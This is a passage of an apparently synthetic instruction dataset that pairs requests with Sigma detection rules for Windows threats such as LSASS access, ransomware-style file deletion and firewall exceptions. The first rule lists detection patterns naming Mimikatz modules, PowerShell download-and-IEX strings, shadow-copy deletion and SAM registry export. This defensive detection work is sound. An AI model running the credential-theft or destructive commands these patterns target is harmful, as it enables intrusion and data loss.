'.downloadfile('  # PowerShell download command\n            - ' /ticket:'  # Rubeus\n            - 'dpapi::'     #Mimikatz\n            - 'event::clear'        #Mimikatz\n            - 'event::drop'     #Mimikatz\n            - 'id::modify'      #Mimikatz\n            - 'kerberos::'       #Mimikatz\n            - 'lsadump::'      #Mimikatz\n            - 'misc::'     #Mimikatz\n            - 'privilege::'       #Mimikatz\n            - 'rpc::'      #Mimikatz\n            - 'sekurlsa::'       #Mimikatz\n            - 'sid::'        #Mimikatz\n            - 'token::'      #Mimikatz\n            - 'vault::cred'     #Mimikatz\n            - 'vault::list'     #Mimikatz\n            - ' p::d '  # Mimikatz\n            - ';iex('  # PowerShell IEX\n            - 'MiniDump'  # Process dumping method apart from procdump\n            - 'net user '\n    filter_ping:\n        CommandLine: 'ping 127.0.0.1 -n 5'\n    filter_vs:\n        Image|endswith: '\\PING.EXE'\n        ParentCommandLine|contains: '\\DismFoDInstall.cmd'\n    filter_config_mgr:\n        ParentImage|startswith: 'C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\'\n    filter_java:\n        ParentImage|startswith: 'C:\\Program Files (x86)\\Java\\'\n        ParentImage|endswith: '\\bin\\javaws.exe'\n        Image|startswith: 'C:\\Program Files (x86)\\Java\\'\n        Image|endswith: '\\bin\\jp2launcher.exe'\n        CommandLine|contains: ' -ma '\n    condition: all of selection* and not 1 of filter_*\nfalsepositives:\n    - Administrative activity\n    - Scripts and administrative tools used in the monitored environment\n    - Monitoring activity\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        IntegrityLevel: System\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    selection_special:\n        - Image|endswith:\n            - '\\calc.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n            - '\\hh.exe'\n            - '\\mshta.exe'\n            - '\\forfiles.exe'\n            - '\\ping.exe'\n        - CommandLine|contains:\n            # - 'sc stop ' # stops a system service # causes FPs\n            - ' -NoP '  # Often used in malicious PowerShell commands\n            - ' -W Hidden '  # Often used in malicious PowerShell commands\n            - ' -decode '  # Used with certutil\n            - ' /decode '  # Used with certutil\n            - ' /urlcache '  # Used with certutil\n            - ' -urlcache '  # Used with certutil\n            - ' -e* JAB'  # PowerShell encoded commands\n            - ' -e* SUVYI'  # PowerShell encoded commands\n            - ' -e* SQBFAFgA'  # PowerShell encoded commands\n            - ' -e* aWV4I'  # PowerShell encoded commands\n            - ' -e* IAB'  # PowerShell encoded commands\n            - ' -e* PAA'  # PowerShell encoded commands\n            - ' -e* aQBlAHgA'  # PowerShell encoded commands\n            - 'vssadmin delete shadows'  # Ransomware\n            - 'reg SAVE HKLM'  # save registry SAM - syskey extraction\n            - ' -ma '  # ProcDump\n            - 'Microsoft\\Windows\\CurrentVersion\\Run'  # Run key in command line - often in combination with REG ADD\n            - '.downloadstring('  # PowerShell download command\n            - '.downloadfile('  # PowerShell download command\n            - ' /ticket:'  # Rubeus\n            - 'dpapi::'     #Mimikatz\n            - 'event::clear'        #Mimikatz\n            - 'event::drop'     #Mimikatz\n            - 'id::modify'      #Mimikatz\n            - 'kerberos::'       #Mimikatz\n            - 'lsadump::'      #Mimikatz\n            - 'misc::'     #Mimikatz\n            - 'privilege::'       #Mimikatz\n            - 'rpc::'      #Mimikatz\n            - 'sekurlsa::'       #Mimikatz\n            - 'sid::'        #Mimikatz\n            - 'token::'      #Mimikatz\n            - 'vault::cred'     #Mimikatz\n            - 'vault::list'     #Mimikatz\n            - ' p::d '  # Mimikatz\n            - ';iex('  # PowerShell IEX\n            - 'MiniDump'  # Process dumping method apart from procdump\n            - 'net user '\n    filter_ping:\n        CommandLine: 'ping 127.0.0.1 -n 5'\n    filter_vs:\n        Image|endswith: '\\PING.EXE'\n        ParentCommandLine|contains: '\\DismFoDInstall.cmd'\n    filter_config_mgr:\n        ParentImage|startswith: 'C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\'\n    filter_java:\n        ParentImage|startswith: 'C:\\Program Files (x86)\\Java\\'\n        ParentImage|endswith: '\\bin\\javaws.exe'\n        Image|startswith: 'C:\\Program Files (x86)\\Java\\'\n        Image|endswith: '\\bin\\jp2launcher.exe'\n        CommandLine|contains: ' -ma '\n    condition: all of selection* and not 1 of filter_*\nfalsepositives:\n    - Administrative activity\n    - Scripts and administrative tools used in the monitored environment\n    - Monitoring activity\nlevel: high\n",
      "question": "suspicious process creation as SYSTEM user (suspicious program or command line parameter)",
      "answer": "In order to detect a suspicious process creation as SYSTEM user (suspicious program or command line parameter), you should: monitor the creation of processes on Windows systems, specifically focusing on events where the process is initiated with System integrity level. Pay close attention to processes initiated by users with names containing variations of \"AUTHORI\" or \"AUTORI\", which are aimed to cover various language settings. \n\nSpecial attention should be given to processes that involve the execution of specific applications such as calculator (calc.exe), Windows Script Host (wscript.exe, cscript.exe), HTML Help (hh.exe), Microsoft HTML Application Host (mshta.exe), forfiles, and ping command executables. These executables are often leveraged in malicious activities when paired with suspicious command line parameters that include, but are not limited to, stopping system services, running PowerShell commands with hidden windows or encoded commands, utilizing certutil for encoding or caching commands, interacting with shadow copies (often in ransomware attacks), extracting system keys, modifying registry entries for persistence, downloading files via PowerShell, using Rubeus and Mimikatz for credential theft and manipulation, invoking in-memory execution with Invoke-Expression (IEx) in PowerShell, and process dumping methods for data exfiltration.\n\nThe detection strategy should exclude known benign activities such as administrative actions, regular scripts, and tools used by systems administrators, as well as specific monitoring tools activities. This methodology aims to minimize false positives while effectively identifying and responding to potential security threats indicated by the attempted or successful creation of processes under the SYSTEM integrity level, involving either suspicious executables or command-line arguments."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting process access to LSASS memory with suspicious access flags and from a potentially suspicious folder.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect process access to LSASS memory with suspicious access flags and from a potentially suspicious folder, you should: Focus on monitoring process access within Windows operating systems, specifically observing any process that attempts to access the memory of the Local Security Authority Subsystem Service (LSASS) executable. This observation should be narrowed down to access attempts where the target image ends with '\\lsass.exe' and the granted access flags end with a set of specific hexadecimal values which could indicate suspicious activities such as unauthorized memory read or write operations.\n\nFurther refine the detection by scrutinizing the source of the access attempt, particularly if it originates from directories often used by legitimate programs but can be abused by attackers, like temporary folders or public user folders. These include paths containing '\\Temp\\', '\\Users\\Public\\', '\\PerfLogs\\', '\\AppData\\', and '\\Temporary'. The detection becomes more credible if these access attempts do not originate from software updaters or installers known to occasionally perform similar actions for legitimate reasons, such as updates from Visual Studio Code, Dropbox, the Microsoft Bootstrapper for Visual Studio, the Google Chrome updater, Keybase, or antivirus software updates like Avira, as these are typically marked as false positives.\n\nTo successfully implement this detection strategy, concentrate on logs that fall under the process access category for Windows products. Tag this activity with relevant MITRE ATT&CK tactics and techniques associated with credential access attempts, especially those attempting to access critical system processes memory like LSASS for credential dumping purposes. Pay attention to access attempts that do not align with expected behavior from known and trusted applications by using exclusions for certain paths and access patterns that are associated with known benign software behavior, thereby reducing false positives. Monitor fields such as User, SourceImage, and GrantedAccess in your log data to effectively identify and respond to potential threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|endswith:\n            - '10'\n            - '30'\n            - '50'\n            - '70'\n            - '90'\n            - 'B0'\n            - 'D0'\n            - 'F0'\n            - '18'\n            - '38'\n            - '58'\n            - '78'\n            - '98'\n            - 'B8'\n            - 'D8'\n            - 'F8'\n            - '1A'\n            - '3A'\n            - '5A'\n            - '7A'\n            - '9A'\n            - 'BA'\n            - 'DA'\n            - 'FA'\n            - '0x14C2'  # https://github.com/b4rtik/ATPMiniDump/blob/76304f93b390af3bb66e4f451ca16562a479bdc9/ATPMiniDump/ATPMiniDump.c\n            - 'FF'\n        SourceImage|contains:\n            - '\\Temp\\'\n            - '\\Users\\Public\\'\n            - '\\PerfLogs\\'\n            - '\\AppData\\'\n            - '\\Temporary'\n    filter_optional_generic_appdata:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|contains: '\\AppData\\Local\\'\n        SourceImage|endswith:\n            - '\\Microsoft VS Code\\Code.exe'\n            - '\\software_reporter_tool.exe'\n            - '\\DropboxUpdate.exe'\n            - '\\MBAMInstallerService.exe'\n            - '\\WebexMTA.exe'\n            - '\\WebEx\\WebexHost.exe'\n            - '\\JetBrains\\Toolbox\\bin\\jetbrains-toolbox.exe'\n        GrantedAccess: '0x410'\n    filter_optional_dropbox_1:\n        SourceImage|startswith: 'C:\\Windows\\Temp\\'\n        SourceImage|endswith: '.tmp\\DropboxUpdate.exe'\n        GrantedAccess:\n            - '0x410'\n            - '0x1410'\n    filter_optional_dropbox_2:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|contains: '\\AppData\\Local\\Temp\\'\n        SourceImage|endswith: '.tmp\\DropboxUpdate.exe'\n        GrantedAccess: '0x1410'\n    filter_optional_dropbox_3:\n        SourceImage|startswith:\n            - 'C:\\Program Files (x86)\\Dropbox\\'\n            - 'C:\\Program Files\\Dropbox\\'\n        SourceImage|endswith: '\\DropboxUpdate.exe'\n        GrantedAccess: '0x1410'\n    filter_optional_nextron:\n        SourceImage|startswith:\n            - 'C:\\Windows\\Temp\\asgard2-agent\\'\n            - 'C:\\Windows\\Temp\\asgard2-agent-sc\\'\n        SourceImage|endswith:\n            - '\\thor64.exe'\n            - '\\thor.exe'\n            - '\\aurora-agent-64.exe'\n            - '\\aurora-agent.exe'\n        GrantedAccess:\n            - '0x1fffff'\n            - '0x1010'\n            - '0x101010'\n    filter_optional_ms_products:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|contains|all:\n            - '\\AppData\\Local\\Temp\\'\n            - '\\vs_bootstrapper_'\n        GrantedAccess: '0x1410'\n    filter_optional_chrome_update:\n        SourceImage|startswith: 'C:\\Program Files (x86)\\Google\\Temp\\'\n        SourceImage|endswith: '.tmp\\GoogleUpdate.exe'\n        GrantedAccess:\n            - '0x410'\n            - '0x1410'\n    filter_optional_keybase:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|endswith: \\AppData\\Local\\Keybase\\keybase.exe\n        GrantedAccess: '0x1fffff'\n    filter_optional_avira:\n        SourceImage|contains: '\\AppData\\Local\\Temp\\is-'\n        SourceImage|endswith: '.tmp\\avira_system_speedup.tmp'\n        GrantedAccess: '0x1410'\n    filter_optional_viberpc_updater:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|contains: '\\AppData\\Roaming\\ViberPC\\'\n        SourceImage|endswith: '\\updater.exe'\n        TargetImage|endswith: '\\winlogon.exe'\n        GrantedAccess: '0x1fffff'\n    filter_optional_adobe_arm_helper:\n        SourceImage|startswith:  # Example path: 'C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\Temp\\2092867405\\AdobeARMHelper.exe'\n            - 'C:\\Program Files\\Common Files\\Adobe\\ARM\\'\n            - 'C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\'\n        SourceImage|endswith: '\\AdobeARMHelper.exe'\n        GrantedAccess: '0x1410'\n    condition: selection and not 1 of filter_optional_*\nfields:\n    - User\n    - SourceImage\n    - GrantedAccess\nfalsepositives:\n    - Updaters and installers are typical false positives. Apply custom filters depending on your environment\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        GrantedAccess|endswith:\n            - '10'\n            - '30'\n            - '50'\n            - '70'\n            - '90'\n            - 'B0'\n            - 'D0'\n            - 'F0'\n            - '18'\n            - '38'\n            - '58'\n            - '78'\n            - '98'\n            - 'B8'\n            - 'D8'\n            - 'F8'\n            - '1A'\n            - '3A'\n            - '5A'\n            - '7A'\n            - '9A'\n            - 'BA'\n            - 'DA'\n            - 'FA'\n            - '0x14C2'  # https://github.com/b4rtik/ATPMiniDump/blob/76304f93b390af3bb66e4f451ca16562a479bdc9/ATPMiniDump/ATPMiniDump.c\n            - 'FF'\n        SourceImage|contains:\n            - '\\Temp\\'\n            - '\\Users\\Public\\'\n            - '\\PerfLogs\\'\n            - '\\AppData\\'\n            - '\\Temporary'\n    filter_optional_generic_appdata:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|contains: '\\AppData\\Local\\'\n        SourceImage|endswith:\n            - '\\Microsoft VS Code\\Code.exe'\n            - '\\software_reporter_tool.exe'\n            - '\\DropboxUpdate.exe'\n            - '\\MBAMInstallerService.exe'\n            - '\\WebexMTA.exe'\n            - '\\WebEx\\WebexHost.exe'\n            - '\\JetBrains\\Toolbox\\bin\\jetbrains-toolbox.exe'\n        GrantedAccess: '0x410'\n    filter_optional_dropbox_1:\n        SourceImage|startswith: 'C:\\Windows\\Temp\\'\n        SourceImage|endswith: '.tmp\\DropboxUpdate.exe'\n        GrantedAccess:\n            - '0x410'\n            - '0x1410'\n    filter_optional_dropbox_2:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|contains: '\\AppData\\Local\\Temp\\'\n        SourceImage|endswith: '.tmp\\DropboxUpdate.exe'\n        GrantedAccess: '0x1410'\n    filter_optional_dropbox_3:\n        SourceImage|startswith:\n            - 'C:\\Program Files (x86)\\Dropbox\\'\n            - 'C:\\Program Files\\Dropbox\\'\n        SourceImage|endswith: '\\DropboxUpdate.exe'\n        GrantedAccess: '0x1410'\n    filter_optional_nextron:\n        SourceImage|startswith:\n            - 'C:\\Windows\\Temp\\asgard2-agent\\'\n            - 'C:\\Windows\\Temp\\asgard2-agent-sc\\'\n        SourceImage|endswith:\n            - '\\thor64.exe'\n            - '\\thor.exe'\n            - '\\aurora-agent-64.exe'\n            - '\\aurora-agent.exe'\n        GrantedAccess:\n            - '0x1fffff'\n            - '0x1010'\n            - '0x101010'\n    filter_optional_ms_products:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|contains|all:\n            - '\\AppData\\Local\\Temp\\'\n            - '\\vs_bootstrapper_'\n        GrantedAccess: '0x1410'\n    filter_optional_chrome_update:\n        SourceImage|startswith: 'C:\\Program Files (x86)\\Google\\Temp\\'\n        SourceImage|endswith: '.tmp\\GoogleUpdate.exe'\n        GrantedAccess:\n            - '0x410'\n            - '0x1410'\n    filter_optional_keybase:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|endswith: \\AppData\\Local\\Keybase\\keybase.exe\n        GrantedAccess: '0x1fffff'\n    filter_optional_avira:\n        SourceImage|contains: '\\AppData\\Local\\Temp\\is-'\n        SourceImage|endswith: '.tmp\\avira_system_speedup.tmp'\n        GrantedAccess: '0x1410'\n    filter_optional_viberpc_updater:\n        SourceImage|startswith: 'C:\\Users\\'\n        SourceImage|contains: '\\AppData\\Roaming\\ViberPC\\'\n        SourceImage|endswith: '\\updater.exe'\n        TargetImage|endswith: '\\winlogon.exe'\n        GrantedAccess: '0x1fffff'\n    filter_optional_adobe_arm_helper:\n        SourceImage|startswith:  # Example path: 'C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\Temp\\2092867405\\AdobeARMHelper.exe'\n            - 'C:\\Program Files\\Common Files\\Adobe\\ARM\\'\n            - 'C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\'\n        SourceImage|endswith: '\\AdobeARMHelper.exe'\n        GrantedAccess: '0x1410'\n    condition: selection and not 1 of filter_optional_*\nfields:\n    - User\n    - SourceImage\n    - GrantedAccess\nfalsepositives:\n    - Updaters and installers are typical false positives. Apply custom filters depending on your environment\nlevel: medium\n",
      "question": "process access to LSASS memory with suspicious access flags and from a potentially suspicious folder",
      "answer": "In order to detect process access to LSASS memory with suspicious access flags and from a potentially suspicious folder, you should: Focus on monitoring process access within Windows operating systems, specifically observing any process that attempts to access the memory of the Local Security Authority Subsystem Service (LSASS) executable. This observation should be narrowed down to access attempts where the target image ends with '\\lsass.exe' and the granted access flags end with a set of specific hexadecimal values which could indicate suspicious activities such as unauthorized memory read or write operations.\n\nFurther refine the detection by scrutinizing the source of the access attempt, particularly if it originates from directories often used by legitimate programs but can be abused by attackers, like temporary folders or public user folders. These include paths containing '\\Temp\\', '\\Users\\Public\\', '\\PerfLogs\\', '\\AppData\\', and '\\Temporary'. The detection becomes more credible if these access attempts do not originate from software updaters or installers known to occasionally perform similar actions for legitimate reasons, such as updates from Visual Studio Code, Dropbox, the Microsoft Bootstrapper for Visual Studio, the Google Chrome updater, Keybase, or antivirus software updates like Avira, as these are typically marked as false positives.\n\nTo successfully implement this detection strategy, concentrate on logs that fall under the process access category for Windows products. Tag this activity with relevant MITRE ATT&CK tactics and techniques associated with credential access attempts, especially those attempting to access critical system processes memory like LSASS for credential dumping purposes. Pay attention to access attempts that do not align with expected behavior from known and trusted applications by using exclusions for certain paths and access patterns that are associated with known benign software behavior, thereby reducing false positives. Monitor fields such as User, SourceImage, and GrantedAccess in your log data to effectively identify and respond to potential threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Compress target file into a cab file stored in the Alternate Data Stream (ADS) of the target file..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to compress target file into a cab file stored in the Alternate Data Stream (ADS) of the target file, you should: monitor process creation logs in Windows for instances where the command line execution includes both the use of 'diantz.exe' and the '.cab' file extension together. Furthermore, it's crucial to watch for command lines matching a regular expression pattern that indicates the use of a colon followed by any character except a backslash, which is a typical method for specifying Alternate Data Streams (ADS) in Windows file systems. Be advised that there's a substantial chance of encountering false positives with this detection strategy, and the risk level associated with this activity is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - diantz.exe\n            - .cab\n        CommandLine|re: ':[^\\\\]'\n    condition: selection\nfalsepositives:\n    - Very Possible\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - diantz.exe\n            - .cab\n        CommandLine|re: ':[^\\\\]'\n    condition: selection\nfalsepositives:\n    - Very Possible\nlevel: medium\n",
      "question": "Compress target file into a cab file stored in the Alternate Data Stream (ADS) of the target file.",
      "answer": "In order to compress target file into a cab file stored in the Alternate Data Stream (ADS) of the target file, you should: monitor process creation logs in Windows for instances where the command line execution includes both the use of 'diantz.exe' and the '.cab' file extension together. Furthermore, it's crucial to watch for command lines matching a regular expression pattern that indicates the use of a colon followed by any character except a backslash, which is a typical method for specifying Alternate Data Streams (ADS) in Windows file systems. Be advised that there's a substantial chance of encountering false positives with this detection strategy, and the risk level associated with this activity is considered medium."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting multiple file rename or delete events occurrence within a specified period of time by a same user (these events may signalize about ransomware activity)..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect multiple file rename or delete events occurrence within a specified period of time by a same user (these events may signalize about ransomware activity), you should:\n\nMonitor Windows security logs for event ID 4663, which indicates an attempt to access a file object. Pay special attention to the instances where the object type is specifically a file and the access list includes '%%1537', signaling a rename or delete operation. Furthermore, ensure the keyword '0x8020000000000000' is present in the log entry, as it denotes a specific type of access attempt related to these operations. To effectively identify potential ransomware activity, look for cases where more than ten of these specific events are detected within a short timeframe of 30 seconds, all linked by the same SubjectLogonId, indicating they were performed by the same user account.\n\nBe mindful of potential false positives which may arise from legitimate activities like software uninstallation processes or file restoration activities, which can also trigger similar log entries. The alert level for such detections is considered medium, emphasizing the need for further investigation to confirm malicious activities. This monitoring strategy aligns with understanding and mitigating tactics and techniques such as Data Destruction and Data Encrypted for Impact, common in ransomware attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : Policies/Windows Settings/Security Settings/Local Policies/Audit Policy/Audit object access, Policies/Windows Settings/Security Settings/Advanced Audit Policy Configuration/Object Access'\ndetection:\n    selection:\n        EventID: 4663\n        ObjectType: 'File'\n        AccessList: '%%1537'\n        Keywords: '0x8020000000000000'\n    timeframe: 30s\n    condition: selection | count() by SubjectLogonId > 10\nfalsepositives:\n    - Software uninstallation\n    - Files restore activities\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\n    definition: 'Requirements: Audit Policy : Policies/Windows Settings/Security Settings/Local Policies/Audit Policy/Audit object access, Policies/Windows Settings/Security Settings/Advanced Audit Policy Configuration/Object Access'\ndetection:\n    selection:\n        EventID: 4663\n        ObjectType: 'File'\n        AccessList: '%%1537'\n        Keywords: '0x8020000000000000'\n    timeframe: 30s\n    condition: selection | count() by SubjectLogonId > 10\nfalsepositives:\n    - Software uninstallation\n    - Files restore activities\nlevel: medium\n",
      "question": "multiple file rename or delete events occurrence within a specified period of time by a same user (these events may signalize about ransomware activity).",
      "answer": "In order to detect multiple file rename or delete events occurrence within a specified period of time by a same user (these events may signalize about ransomware activity), you should:\n\nMonitor Windows security logs for event ID 4663, which indicates an attempt to access a file object. Pay special attention to the instances where the object type is specifically a file and the access list includes '%%1537', signaling a rename or delete operation. Furthermore, ensure the keyword '0x8020000000000000' is present in the log entry, as it denotes a specific type of access attempt related to these operations. To effectively identify potential ransomware activity, look for cases where more than ten of these specific events are detected within a short timeframe of 30 seconds, all linked by the same SubjectLogonId, indicating they were performed by the same user account.\n\nBe mindful of potential false positives which may arise from legitimate activities like software uninstallation processes or file restoration activities, which can also trigger similar log entries. The alert level for such detections is considered medium, emphasizing the need for further investigation to confirm malicious activities. This monitoring strategy aligns with understanding and mitigating tactics and techniques such as Data Destruction and Data Encrypted for Impact, common in ransomware attacks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of Time Travel Debugging Utility, where adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe, you should: Monitor Windows image load events for the loading of specific libraries including 'ttdrecord.dll', 'ttdwriter.dll', and 'ttdloader.dll'. These libraries are associated with the Time Travel Debugging Utility which could be exploited by an attacker to execute or analyze malicious processes stealthily. Be conscious of false positives which might arise from legitimate use by software developers or testers. This activity carries a high severity level due to its potential use in undermining process integrity and conducting unauthorized actions on the system.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: image_load\ndetection:\n    selection:\n        ImageLoaded|endswith:\n            - '\\ttdrecord.dll'\n            - '\\ttdwriter.dll'\n            - '\\ttdloader.dll'\n    condition: selection\nfalsepositives:\n    - Legitimate usage by software developers/testers\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: image_load\ndetection:\n    selection:\n        ImageLoaded|endswith:\n            - '\\ttdrecord.dll'\n            - '\\ttdwriter.dll'\n            - '\\ttdloader.dll'\n    condition: selection\nfalsepositives:\n    - Legitimate usage by software developers/testers\nlevel: high\n",
      "question": "usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe.",
      "answer": "In order to detect usage of Time Travel Debugging Utility, where adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe, you should: Monitor Windows image load events for the loading of specific libraries including 'ttdrecord.dll', 'ttdwriter.dll', and 'ttdloader.dll'. These libraries are associated with the Time Travel Debugging Utility which could be exploited by an attacker to execute or analyze malicious processes stealthily. Be conscious of false positives which might arise from legitimate use by software developers or testers. This activity carries a high severity level due to its potential use in undermining process integrity and conducting unauthorized actions on the system."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting addition of a rule to the Windows Firewall exception list where the application resides in a suspicious folder.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the addition of a rule to the Windows Firewall exception list where the application resides in a suspicious folder, you should: \n\nMonitor the Windows firewall activity, particularly on Windows 10 and 11 platforms. Keep an eye out for event IDs 2004 and 2071, which indicate that a new rule has been added to the Windows Defender Firewall exception list. Specifically, focus on applications added to the exception list that are located within the '\\AppData\\' or '\\Temp\\' directories. These locations are often used by malicious software because they are user-accessible and frequently overlooked by users and some security programs.\n\nIt's important to exclude from alerts any changes that involve a predefined list of applications that might normally operate from those directories for benign reasons. These include well-known applications such as Microsoft Teams, Keybase, Messenger, and Opera Browser if they are exactly located in their usual application paths like '\\AppData\\local\\microsoft\\teams\\current\\teams.exe' for Teams, '\\AppData\\Local\\Keybase\\keybase.exe' for Keybase, etc.\n\nYou need to be cautious and consider any legitimate application that runs from the AppData user directory as a potential false positive. Such applications may also add firewall exceptions as part of their normal operations. Therefore, while maintaining a high level of alertness for suspicious activity associated with these event IDs and paths, careful investigation of each incident is advised to distinguish between legitimate and malicious activities.\n\nThis monitoring approach targets tactics associated with Persistence and Privilege Escalation, where attackers attempt to maintain their presence on a system and potentially elevate their control by making their malicious software harder to block by adding it to the firewall's exception list.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: firewall-as\ndetection:\n    selection:\n        EventID:\n            - 2004 # A rule has been added to the Windows Defender Firewall exception list. (Windows 10)\n            - 2071 # A rule has been added to the Windows Defender Firewall exception list. (Windows 11)\n        ApplicationPath|contains:\n            - '\\AppData\\'\n            - '\\Temp\\'\n    filter_main_block:\n        Action: 2\n    filter_optional_teams:\n        ApplicationPath|endswith: '\\AppData\\local\\microsoft\\teams\\current\\teams.exe'\n    filter_optional_keybase:\n        ApplicationPath|endswith: '\\AppData\\Local\\Keybase\\keybase.exe'\n    filter_optional_messenger:\n        ApplicationPath|endswith: '\\AppData\\Local\\Programs\\Messenger\\Messenger.exe'\n    filter_optional_opera:\n        ApplicationPath|startswith: 'C:\\Users\\'\n        ApplicationPath|contains: '\\AppData\\Local\\Programs\\Opera\\'\n        ApplicationPath|endswith: '\\opera.exe'\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Any legitimate application that runs from the AppData user directory\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: firewall-as\ndetection:\n    selection:\n        EventID:\n            - 2004 # A rule has been added to the Windows Defender Firewall exception list. (Windows 10)\n            - 2071 # A rule has been added to the Windows Defender Firewall exception list. (Windows 11)\n        ApplicationPath|contains:\n            - '\\AppData\\'\n            - '\\Temp\\'\n    filter_main_block:\n        Action: 2\n    filter_optional_teams:\n        ApplicationPath|endswith: '\\AppData\\local\\microsoft\\teams\\current\\teams.exe'\n    filter_optional_keybase:\n        ApplicationPath|endswith: '\\AppData\\Local\\Keybase\\keybase.exe'\n    filter_optional_messenger:\n        ApplicationPath|endswith: '\\AppData\\Local\\Programs\\Messenger\\Messenger.exe'\n    filter_optional_opera:\n        ApplicationPath|startswith: 'C:\\Users\\'\n        ApplicationPath|contains: '\\AppData\\Local\\Programs\\Opera\\'\n        ApplicationPath|endswith: '\\opera.exe'\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Any legitimate application that runs from the AppData user directory\nlevel: high\n",
      "question": "addition of a rule to the Windows Firewall exception list where the application resides in a suspicious folder",
      "answer": "In order to detect the addition of a rule to the Windows Firewall exception list where the application resides in a suspicious folder, you should: \n\nMonitor the Windows firewall activity, particularly on Windows 10 and 11 platforms. Keep an eye out for event IDs 2004 and 2071, which indicate that a new rule has been added to the Windows Defender Firewall exception list. Specifically, focus on applications added to the exception list that are located within the '\\AppData\\' or '\\Temp\\' directories. These locations are often used by malicious software because they are user-accessible and frequently overlooked by users and some security programs.\n\nIt's important to exclude from alerts any changes that involve a predefined list of applications that might normally operate from those directories for benign reasons. These include well-known applications such as Microsoft Teams, Keybase, Messenger, and Opera Browser if they are exactly located in their usual application paths like '\\AppData\\local\\microsoft\\teams\\current\\teams.exe' for Teams, '\\AppData\\Local\\Keybase\\keybase.exe' for Keybase, etc.\n\nYou need to be cautious and consider any legitimate application that runs from the AppData user directory as a potential false positive. Such applications may also add firewall exceptions as part of their normal operations. Therefore, while maintaining a high level of alertness for suspicious activity associated with these event IDs and paths, careful investigation of each incident is advised to distinguish between legitimate and malicious activities.\n\nThis monitoring approach targets tactics associated with Persistence and Privilege Escalation, where attackers attempt to maintain their presence on a system and potentially elevate their control by making their malicious software harder to block by adding it to the firewall's exception list."
    }
  },
  {
